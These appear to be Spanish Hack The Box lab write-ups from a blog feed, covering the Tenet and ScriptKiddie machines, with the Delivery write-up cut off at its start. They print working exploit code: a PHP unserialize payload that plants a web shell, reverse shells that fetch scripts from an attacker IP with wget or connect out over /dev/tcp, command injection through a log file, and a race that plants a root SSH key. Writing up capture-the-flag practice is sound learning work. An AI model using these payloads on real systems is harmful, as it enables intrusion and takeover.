backup.\n1 neil: did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?! Encontramos que el archivo sator.php aun existe pero no en el dominio que encontramos si no directamente en la direcion IP, por lo que posiblemente el backup esté en el mismo lugar.\n1 2 [+] Grabbing users from text file \u0026lt;br\u0026gt; [] Database updated \u0026lt;br\u0026gt; PHP UNSERIALIZE - RCE Neil habla de un backup pero no especifíca de que archivo/software/db, aunque menciona sator.php, agregamos la extension de un backup (bak) al archivo sator.php.bak y logramos obtener el codigo fuente.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;?php class DatabaseExport { public $user_file = \u0026#39;users.txt\u0026#39;; public $data = \u0026#39;\u0026#39;; public function update_db() { echo \u0026#39;[+] Grabbing users from text file \u0026lt;br\u0026gt;\u0026#39;; $this-\u0026gt; data = \u0026#39;Success\u0026#39;; } public function __destruct() { file_put_contents(__DIR__ . \u0026#39;/\u0026#39; . $this -\u0026gt;user_file, $this-\u0026gt;data); echo \u0026#39;[] Database updated \u0026lt;br\u0026gt;\u0026#39;; //\techo \u0026#39;Gotta get this working properly...\u0026#39;; } } $input = $_GET[\u0026#39;arepo\u0026#39;] ?? \u0026#39;\u0026#39;; $databaseupdate = unserialize($input); $app = new DatabaseExport; $app -\u0026gt; update_db(); ?\u0026gt; Al analizar el codigo, observamos una variable que obtiene el valor pasado al parametro arepo por medio de una solicitud GET, este valor es unserializado (unzerialize($_GET['arepo'])), por ultimo se crea un objeto del tipo DatabaseExport() y realiza la ejecucion de la funcion update_db(). Sabiendo lo anterior vamos a enfocarnos en la funcion unserialize() ya que si se le pasa un valor serializado este puede ser ejecutado como se indica en la documentacion de php.\nAdvertencia: \u0026hellip; La deserialización puede resultar en que el código sea cargado y ejecutado debido a la instanciación y autocarga de objetos, y un usuario malicioso podría ser capaz de explotar este comportamiento. \u0026hellip;\rUn post que explica como es posible explotar esta vulnerabilidad. En el caso de sator.php, este crea y escribe dentro de un archivo con el valor de las variables. Si podriamos cambiar estos valores podriamos crear archivos con codigo PHP para la ejecucion de nuestro propio codigo. Para explotar unserialize() se crea una clase, se crea un objeto, se serializa y codifica en url, este valor se le pasa a sator.php?arepo=VALOR.\n1 2 3 4 5 6 7 8 9 10 \u0026lt;?php class DatabaseExport { public $user_file = \u0026#39;batman.php\u0026#39;; public $data = \u0026#39;\u0026lt;?php echo \u0026#34;knock knock\u0026#34;; ?\u0026gt;\u0026#39;; } echo urlencode(serialize(new DatabaseExport)); ?\u0026gt; 1 2 3 4 5 ┌──(kali㉿kali)-[~/htb/tenet] └─$ php example.php O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A10%3A%22batman.php%22%3Bs%3A4%3A%22data%22%3Bs%3A28%3A%22%3C%3Fphp+echo+%22knock+knock%22%3B+%3F%3E%22%3B%7D ┌──(kali㉿kali)-[~/htb/tenet] └─$ curl -s \u0026#34;http://10.10.10.223/sator.php?arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A10%3A%22batman.php%22%3Bs%3A4%3A%22data%22%3Bs%3A28%3A%22%3C%3Fphp+echo+%22knock+knock%22%3B+%3F%3E%22%3B%7D\u0026#34; Confirmamos que el archivo se haya creado, por lo que ahora vamos a ejecutar comandos para enumerar la maquina utilizando una webshell o ejecutando una shell inversa.\n1 2 3 4 5 ┌──(kali㉿kali)-[~/htb/tenet] └─$ curl -s http://10.10.10.223/batman.php knock knock ┌──(kali㉿kali)-[~/htb/tenet] └─$ WWW-DATA - USER Utilizamos el siguiente codigo en la variable $data generamos el codigo serializado y codificado, se envia a la solicitud a sator.php para obtener una shell con el usuario www-data.\n1 2 3 \u0026lt;?php [... REDACTED ...] $data = \u0026#39;\u0026lt;?php $sock=fsockopen(\u0026#34;10.10.10.10\u0026#34;,1338);$proc=proc_open(\u0026#34;/bin/sh -i\u0026#34;, array(0=\u0026gt;$sock, 1=\u0026gt;$sock, 2=\u0026gt;$sock),$pipes);echo \u0026#34;hi\u0026#34; ?\u0026gt;\u0026#39;; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ┌──(kali㉿kali)-[~/htb/tenet] └─$ rlwrap nc -lvp 1338 listening on [any] 1338 ... connect to [10.10.10.10] from tenet.htb [10.10.10.223] 48066 can\u0026#39;t access tty; job control turned off which python which python3 /usr/bin/python3 python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; whoami;id;pwd whoami;id;pwd www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) /var/www/html www-data@tenet:/var/www/html$ NEIL - USER Realizamos una pequeña enumeracion en los archivos de wordpress donde logramos encontrar una contraseña que aparentemente es del usuario neil para la base de datos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 /** MySQL database username */ define( \u0026#39;DB_USER\u0026#39;, \u0026#39;neil\u0026#39; ); /** MySQL database password */ define( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;Opera2112\u0026#39; ); /** MySQL hostname */ define( \u0026#39;DB_HOST\u0026#39;, \u0026#39;localhost\u0026#39; ); /** Database Charset to use in creating database tables. */ define( \u0026#39;DB_CHARSET\u0026#39;, \u0026#39;utf8mb4\u0026#39; ); /** The Database Collate type. Don\u0026#39;t change this if in doubt. */ define( \u0026#39;DB_COLLATE\u0026#39;, \u0026#39;\u0026#39; ); define( \u0026#39;WP_HOME\u0026#39;, \u0026#39;http://tenet.htb\u0026#39;); define( \u0026#39;WP_SITEURL\u0026#39;, \u0026#39;http://tenet.htb\u0026#39;); Verificamos que este mismo usuario exista en la maquina y tenga acceso en la maquina.\n1 2 3 4 www-data@tenet:/var$ root:x:0:0:root:/root:/bin/bash neil:x:1001:1001:neil,,,:/home/neil:/bin/bash www-data@tenet:/var$ Utilizamos la contraseña encontrada, logramos obtener una shell y nuestra flag user.txt en la carpeta de neil.\n1 2 3 4 5 6 7 8 9 10 su: Authentication failure www-data@tenet:/$ su neil Password: Opera2112 www-data@tenet:/$ echo $HOME /home/neil www-data@tenet:/$ cd www-data@tenet:/$ cat user.txt | cut -c1-15 ebd148d5598d5dd neil@tenet:~$ PRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el script enableSSH.sh. Vemos el codigo del script y realiza la escritura de la clave publica ssh del usuario root, pero vemos en la funcion addKey que genera un archivo temporal donde realiza la escritura de la clave publica, luego verifica si el archivo existe y si es asi escribe la clave en /root/.ssh/authorized_keys, finalmente elimina el archivo temporal creado.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 neil@tenet:~$ sudo -l -l Matching Defaults entries for neil on tenet: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\: User neil may run the following commands on tenet: Sudoers entry: RunAsUsers: ALL RunAsGroups: ALL Options: !authenticate Commands: /usr/local/bin/enableSSH.sh neil@tenet:~$ ls -lah /usr/local/bin/enableSSH.sh -rwxr-xr-x 1 root root 1.1K Dec 8 13:46 /usr/local/bin/enableSSH.sh neil@tenet:~$ cat /usr/local/bin/enableSSH.sh #!/bin/bash checkAdded() { sshName=$(/bin/echo $key | /usr/bin/cut -d \u0026#34; \u0026#34; -f 3) # root@ubuntu if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then /bin/echo \u0026#34;Successfully added $sshName to authorized_keys file!\u0026#34; else /bin/echo \u0026#34;Error in adding $sshName to authorized_keys file!\u0026#34; fi } checkFile() { if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then /bin/echo \u0026#34;Error in creating key file!\u0026#34; if [[ -f $1 ]]; then /bin/rm $1; fi exit 1 fi } addKey() { tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX) (umask 110; touch $tmpName) /bin/echo $key \u0026gt;\u0026gt;$tmpName checkFile $tmpName /bin/cat $tmpName \u0026gt;\u0026gt;/root/.ssh/authorized_keys /bin/rm $tmpName } key=\u0026#34;ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu\u0026#34; addKey checkAdded # root@ubuntu neil@tenet:~$ La creacion del archivo temporal (tmpName), la escritura de la clave en este y la eliminacion del archivo temporal es demaciado rapida, por lo que debemos de escribir lo más rapido posible en el archivo temporal nuestra clave publica. Para ello realizamos un bucle while escribiendo en el archivo /tmp/ssh-* nuestra clave, hasta que en algun momento se realice la escritura ejecutando en repetidas ocaciones el script con sudo, al mismo tiempo realizamos intentos de ingreso por medio de ssh con usuario root a traves de ssh y esperamos a que en algun momento dado podamos acceder a la cuenta de root.\n1 2 3 4 5 #!/bin/bash while : do echo \u0026#34;ssh-rsa AAAAB3Nz[... REDACTED ...] neil@tenet\u0026#34; | tee /tmp/ssh* \u0026gt; /dev/null done 1 2 #Intentos en SSH. while true; do ssh -i .ssh/id_rsa root@localhost 2\u0026gt;/dev/null; done Despues de varios intentos logramos obtener una shell con el usuario root y la flag root.txt.\n1 2 3 4 5 6 7 8 9 root@tenet:~# whoami; id; pwd root uid=0(root) gid=0(root) groups=0(root) /root root@tenet:~# ls root.txt root@tenet:~# cat root.txt | cut -c1-15 aaf8bff1f2fc43e root@tenet:~# CRONTAB Encontramos un cron especificamente para eliminar el archivo authorized_keys.\n1 2 3 4 5 root@tenet:~# crontab -l # [ ... REDACTED ...] # m h dom mon dow command */3 * * * * rm /root/.ssh/authorized_keys */3 * * * * rm /dev/shm/* MYSQL Dentro de la base de datos de wordpress encontramos la contraseña encriptada del usuario protagonist.\n1 2 3 4 5 6 7 8 9 10 mysql\u0026gt; select user_login,user_pass from wp_users; +-------------+------------------------------------+ | user_login | user_pass | +-------------+------------------------------------+ | protagonist | $P$BqNNfN07OWdaEfHmGwufBs.b.BebvZ. | | neil | $P$BtFC5SOvjEMFWLE4zq5DWXy7sJPUqM. | +-------------+------------------------------------+ 2 rows in set (0.00 sec) mysql\u0026gt; ","description":"Tenet es presentada con dificultad media, la enumeracion en wordpress  nos llevo al codigo fuente de una pagina la cual fue vulnerada mediante un objeto serializado. Se utilizaron las credenciales en archivos de configuracion para realizar movimiento lateral. Un pequeño script para la escritura de nuestra clave privada en un archivo temporal proporciono una shell root.","id":60,"section":"posts","tags":["wpscan","wordpress","unserialize","php","sudo","bash script"],"title":"Hack The Box - Tenet","uri":"https://sckull.github.io/posts/tenet/"},{"content":"\rScriptKiddie es una maquina con dificultad Facil, obtuvimos acceso mediante la creacion de una plantilla apk para inyeccion de comandos. Mediante el analisis de codigo de la aplicacion web y scripts ejecutados por esta, realizamos una inyeccion de comandos para obtener acceso a un segundo usuario. Finalmente para obtener acceso como superusuario utilizamos los permisos sudo para ejecutar metasploit.\nNombre ScriptKiddie OS Linux Puntos 20 Dificultad Facil IP 10.10.10.226 Maker 0xdf\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[4.5, 3.4, 5.1, 4.9, 6.6],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[3, 4, 8, 2, 6],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} RECON NMAP Escaneo de puertos con nmap nos muestra el puerto ssh (22) y el puerto http (5000) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 Nmap scan report for 10.129.72.163 (10.129.72.163) Host is up (0.16s latency). Not shown: 62106 closed ports, 3427 filtered ports PORT STATE SERVICE 22/tcp open ssh 5000/tcp open upnp Nmap scan report for 10.129.72.163 (10.129.72.163) Host is up (0.067s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 5000/tcp open http Werkzeug httpd 0.16.1 (Python 3.8.5) |_http-server-header: Werkzeug/0.16.1 Python/3.8.5 |_http-title: k1d\u0026#39;5 h4ck3r t00l5 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel HTTP Encontramos una pagina web en el puerto 80 donde se muestran 3 secciones.\nLa primera opcion es para realizar un escaneo de puertos a una determinada IP utilizando nmap en su version 7.80. La segunda, genera un payload para Linux, Windows y Android utilizando lo que parece ser msfvenom, donde es posible subir una template para generar el payload. En la tercera, realiza una busqueda de exploits utilizando searchsploit. Verificamos cada uno de los parametros por posible Inyeccion de Comandos e intentar descargar algun archivo en la maquina pero no logramos nada. Además cada vez que intentavamos ejecutar algun comando nos mostraba el mensaje stop hacking me - well hack you back.\nEl mensaje stop hacking me - well hack you back dejaba en duda si la maquina realizaba algun tipo de escaneo, ping o solicitudes a nuestra maquina por lo que utilizamos wireshark para analizar los paquetes y vemos que realiza un escaneo de puertos a nuestra maquina despues de enviar algun metacaracter o algo que no fuera una letra o numero.\nKID - USER MSFVENOM - APK TEMPLATE Realizamos una busqueda de posibles vulnerabilidades para msfvenom y encontramos una vulnerabilidad de Inyeccion de comandos a partir de un template de APK lo que nos permitiría ejecutar una shell inversa. En el exploit, editamos y agregamos nun comando para descargar y ejecutar nuestra shell inversa en la variable payload, creamos el archivo que contiene nuestro comando, ejecutamos un mini-server con python y escuchamos el puerto con netcat.\n1 2 3 4 5 6 7 8 9 10 11 #variable - payload payload = \u0026#39;$(bash -c \u0026#34;$(wget -qO- 10.10.14.166/shell.sh)\u0026#34;)\u0026#39; #shell.sh bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.166/1338 0\u0026gt;\u0026amp;1 #local host python -m http.server 80 #listen netcat port nc -lvvp 1338 Generamos nuestro apk y lo enviamos como un template de Android ingresando una IP cualquiera.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 kali@kali:~/htb/scriptkiddie$ python3 exploit_apk_template.py [+] Manufacturing evil apkfile Payload: $(bash -c \u0026#34;$(wget -qO- 10.10.14.166/shell.sh)\u0026#34;) -dname: CN=\u0026#39;|echo JChiYXNoIC1jICIkKHdnZXQgLXFPLSAxMC4xMC4xNC4xNjYvc2hlbGwuc2gpIik= | base64 -d | sh # adding: empty (stored 0%) Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true jar signed. Warning: The signer\u0026#39;s certificate is self-signed. [+] Done! apkfile is at /tmp/tmpidnixpiw/evil.apk Do: msfvenom -x /tmp/tmpidnixpiw/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null Logramos obtener una shell con el usuario kid y nuestra flag user.txt.\nTambien logramos obtener el codigo fuente de la aplicacion.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 import datetime import os import random import re import subprocess import tempfile import time from flask import Flask, render_template, request from hashlib import md5 from werkzeug.utils import secure_filename regex_ip = re.compile(r\u0026#39;^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$\u0026#39;) regex_alphanum = re.compile(r\u0026#39;^[A-Za-z0-9 \\.]+$\u0026#39;) OS_2_EXT = {\u0026#39;windows\u0026#39;: \u0026#39;exe\u0026#39;, \u0026#39;linux\u0026#39;: \u0026#39;elf\u0026#39;, \u0026#39;android\u0026#39;: \u0026#39;apk\u0026#39;} app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;,\u0026#39;POST\u0026#39;]) def index(): if request.method == \u0026#39;GET\u0026#39; or not \u0026#39;action\u0026#39; in request.form: return render_template(\u0026#39;index.html\u0026#39;) elif request.form[\u0026#39;action\u0026#39;] == \u0026#39;scan\u0026#39;: return scan(request.form[\u0026#39;ip\u0026#39;]) elif request.form[\u0026#39;action\u0026#39;] == \u0026#39;generate\u0026#39;: return venom(request) elif request.form[\u0026#39;action\u0026#39;] == \u0026#39;searchsploit\u0026#39;: return searchsploit(request.form[\u0026#39;search\u0026#39;], request.remote_addr) print(\u0026#34;no valid action\u0026#34;) return request.form def scan(ip): if regex_ip.match(ip): if not ip == request.remote_addr and ip.startswith(\u0026#39;10.10.1\u0026#39;) and not ip.startswith(\u0026#39;10.10.10.\u0026#39;): stime = random.randint(200,400)/100 time.sleep(stime) result = f\u0026#34;\u0026#34;\u0026#34;Starting Nmap 7.80 ( https://nmap.org ) at {datetime.datetime.utcnow().strftime(\u0026#34;%Y-%m-%d %H:%M\u0026#34;)} UTC\\nNote: Host seems down. If it is really up, but blocking our ping probes, try -Pn\\nNmap done: 1 IP address (0 hosts up) scanned in {stime} seconds\u0026#34;\u0026#34;\u0026#34;.encode() else: result = subprocess.check_output([\u0026#39;nmap\u0026#39;, \u0026#39;--top-ports\u0026#39;, \u0026#39;100\u0026#39;, ip]) return render_template(\u0026#39;index.html\u0026#39;, scan=result.decode(\u0026#39;UTF-8\u0026#39;, \u0026#39;ignore\u0026#39;)) return render_template(\u0026#39;index.html\u0026#39;, scanerror=\u0026#34;invalid ip\u0026#34;) def searchsploit(text, srcip): if regex_alphanum.match(text): result = subprocess.check_output([\u0026#39;searchsploit\u0026#39;, \u0026#39;--color\u0026#39;, text]) return render_template(\u0026#39;index.html\u0026#39;, searchsploit=result.decode(\u0026#39;UTF-8\u0026#39;, \u0026#39;ignore\u0026#39;)) else: with open(\u0026#39;/home/kid/logs/hackers\u0026#39;, \u0026#39;a\u0026#39;) as f: f.write(f\u0026#39;[{datetime.datetime.now()}] {srcip}\\n\u0026#39;) return render_template(\u0026#39;index.html\u0026#39;, sserror=\u0026#34;stop hacking me - well hack you back\u0026#34;) def venom(request): errors = [] file = None if not \u0026#39;lhost\u0026#39; in request.form: errors.append(\u0026#39;lhost missing\u0026#39;) else: lhost = request.form[\u0026#39;lhost\u0026#39;] if not regex_ip.match(lhost): errors.append(\u0026#39;invalid lhost ip\u0026#39;) if not \u0026#39;os\u0026#39; in request.form: errors.append(\u0026#39;os missing\u0026#39;) else: tar_os = request.form[\u0026#39;os\u0026#39;] if tar_os not in [\u0026#39;windows\u0026#39;, \u0026#39;linux\u0026#39;, \u0026#39;android\u0026#39;]: errors.append(f\u0026#39;invalid os: {tar_os}\u0026#39;) if \u0026#39;template\u0026#39; in request.files and request.files[\u0026#39;template\u0026#39;].filename != \u0026#39;\u0026#39;: file = request.files[\u0026#39;template\u0026#39;] if not (\u0026#39;.\u0026#39; in file.filename and file.filename.split(\u0026#39;.\u0026#39;)[-1] == OS_2_EXT[tar_os]): errors.append(f\u0026#39;{tar_os} requires a {OS_2_EXT[tar_os]} ext template file\u0026#39;) else: template_name = secure_filename(file.filename) template_ext = file.filename.split(\u0026#39;.\u0026#39;)[-1] template_file = tempfile.NamedTemporaryFile(\u0026#39;wb\u0026#39;, suffix=\u0026#39;.\u0026#39;+template_ext) file.save(template_file.name) else: template_name = \u0026#34;None\u0026#34; if errors: return render_template(\u0026#39;index.html\u0026#39;, payloaderror=\u0026#39;\u0026lt;br/\u0026gt;\\n\u0026#39;.join(errors)) payload = f\u0026#39;{tar_os}/meterpreter/reverse_tcp\u0026#39; outfilename = md5(request.remote_addr.encode()).hexdigest()[:12] + \u0026#39;.\u0026#39; + OS_2_EXT[tar_os] outfilepath = os.path.join(app.root_path, \u0026#39;static\u0026#39;, \u0026#39;payloads\u0026#39;, outfilename) try: if file: print(f\u0026#39;msfvenom -x {template_file.name} -p {payload} LHOST={lhost} LPORT=4444\u0026#39;) result = subprocess.check_output([\u0026#39;msfvenom\u0026#39;, \u0026#39;-x\u0026#39;, template_file.name, \u0026#39;-p\u0026#39;, payload, f\u0026#39;LHOST={lhost}\u0026#39;, \u0026#39;LPORT=4444\u0026#39;, \u0026#39;-o\u0026#39;, outfilepath]) template_file.close() else: result = subprocess.check_output([\u0026#39;msfvenom\u0026#39;, \u0026#39;-p\u0026#39;, payload, f\u0026#39;LHOST={lhost}\u0026#39;, \u0026#39;LPORT=4444\u0026#39;, \u0026#39;-o\u0026#39;, outfilepath]) except subprocess.CalledProcessError: return render_template(\u0026#39;index.html\u0026#39;, payloaderror=\u0026#34;Something went wrong\u0026#34;) return render_template(\u0026#39;index.html\u0026#39;, payload=payload, lhost=lhost, lport=4444, template=template_name, fn=outfilename) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;) PWN - USER Realizamos una enumeracion en la carpeta del usuario pwn y encontramos un script el cual realiza la lectura de direcciones IP o lo que contenga el archivo log que se encuentra en la carpeta de kid y escanea 10 puertos de las distintas direcciones en segundo plano, guardandolas en un archivo por separado.\n1 2 3 4 5 6 7 8 9 10 #!/bin/bash log=/home/kid/logs/hackers cd /home/pwn/ cat $log | cut -d\u0026#39; \u0026#39; -f3- | sort -u | while read ip; do sh -c \u0026#34;nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2\u0026gt;\u0026amp;1 \u0026gt;/dev/null\u0026#34; \u0026amp; done if [[ $(wc -l \u0026lt; $log) -gt 0 ]]; then echo -n \u0026gt; $log; fi Despues de dar vueltas por la maquina no encontramos algo de ayuda para cambiar al usuario pwn, pero en el codigo fuente de la aplicacion tambien se encontraba el archivo de log en donde realiza la escritura de la direccion IP que intentó \u0026ldquo;vulnerar\u0026rdquo; la aplicacion (stop hacking me - well hack you back), por lo que quizas este archivo solo se ejecuta cada vez que alguien intenta \u0026ldquo;vulnerar\u0026rdquo; la aplicacion.\n1 2 3 4 5 6 7 8 def searchsploit(text, srcip): if regex_alphanum.match(text): result = subprocess.check_output([\u0026#39;searchsploit\u0026#39;, \u0026#39;--color\u0026#39;, text]) return render_template(\u0026#39;index.html\u0026#39;, searchsploit=result.decode(\u0026#39;UTF-8\u0026#39;, \u0026#39;ignore\u0026#39;)) else: with open(\u0026#39;/home/kid/logs/hackers\u0026#39;, \u0026#39;a\u0026#39;) as f: f.write(f\u0026#39;[{datetime.datetime.now()}] {srcip}\\n\u0026#39;) return render_template(\u0026#39;index.html\u0026#39;, sserror=\u0026#34;stop hacking me - well hack you back\u0026#34;) Utilizamos pspy para verificar si este archivo era ejecutado, confirmamos que dicho archivo se ejecuta y lo hace el usuario pwn.\nDe cierta forma debemos de ejecutar comandos ingresando estos en el archivo /home/kid/logs/hackers para que scanlosers.sh lo ejecute, lo hacemos ingresando una fecha como lo hace la aplicacion o cualquier otra cosa pero que contenga un espacio y una direccion IP agregando nuestro comando entre punto y coma y finalizar con numeral (IP; comando ;#) de tal forma que cuando el archivo ejecute el escaneo a la direccion ip tambien ejecute nuestro comando y no ejecute lo demás.\n1 2 3 4 5 6 7 8 #Original #sh -c \u0026#34;nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2\u0026gt;\u0026amp;1 \u0026gt;/dev/null\u0026#34; \u0026amp; #[2021-02-07 02:06:28.242343] 127.0.0.1; id ;# sh -c \u0026#34;nmap --top-ports 10 -oN recon/127.0.0.1; id ;#.nmap 127.0.0.1;id; 2\u0026gt;\u0026amp;1 \u0026gt;/dev/null\u0026#34; \u0026amp; #Ejecucion nmap --top-ports 10 -oN recon/127.0.0.1; id ;# Agregamos nuestro comando de ejecucion de shell inversa al archivo hackers. Generamos el mensaje (stop hacking me - well hack you back) ingresando algun caracter como - en la busqueda de searchsploit para que ejecute nuestra shell inversa con lo que logramos obtener nuestra shell con el usuario pwn.\n# echo \u0026#34;useless words 127.0.0.1; bash -c \u0026#34;$(wget -qO- 10.10.14.166/shell.sh);#\u0026#34; \u0026gt; /home/kid/logs/hackers useless words 127.0.0.1; bash -c \u0026#34;$(wget -qO- 10.10.14.166/shell.sh);# PRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando /opt/metasploit-framework-6.0.9/msfconsole. Ejecutamos msfconsole y logramos obtener una \u0026ldquo;shell\u0026rdquo; con usuario root y nuestra flag root.txt.\n","description":"ScriptKiddie es una maquina con dificultad Facil, obtuvimos acceso mediante la creacion de una plantilla apk para inyeccion de comandos. Mediante el analisis de codigo de la aplicacion web y scripts ejecutados por esta, realizamos una inyeccion de comandos para obtener acceso a un segundo usuario. Finalmente para obtener acceso como superusuario utilizamos los permisos sudo para ejecutar metasploit.","id":61,"section":"posts","tags":["msfvenom","pspy","apk template injection","metasploit","android"],"title":"Hack The Box - ScriptKiddie","uri":"https://sckull.github.io/posts/scriptkiddie/"},{"content":"\rDelivery expone osTicket el cual nos permitio registrarnos en Mattermost, en este ultimo encontramos credenciales, utilizamos estas para acceder por SSH. Enumeramos la base de datos con credenciales de un archivo de configuracion encontramos hashes que crackeamos con un Wordlist personalizado utilizando reglas de John con informacion de Mattermost, con ello logramos escalar privilegios.\nInformacion de la Maquina Nombre Delivery OS Linux Puntos 20 Dificultad Facil IP 10.10.10.222 Maker ippsec\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6, 5.5, 3.9, 6.1, 4.5],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} NMAP Escaneo de puertos con nmap nos muestra el puerto http (80), ssh (22) y el puerto 8065 abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 # Nmap 7.80 scan initiated Wed Feb 10 18:30:51 2021 as: nmap -p- --min-rate 1000 -T4 -oN allports delivery.htb Warning: 10.10.10.222 giving up on port because retransmission cap hit (6). Nmap scan report for delivery.htb (10.10.10.222) Host is up (0.076s latency). Not shown: 57054 closed ports, 8478 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8065/tcp open unknown # Nmap done at Wed 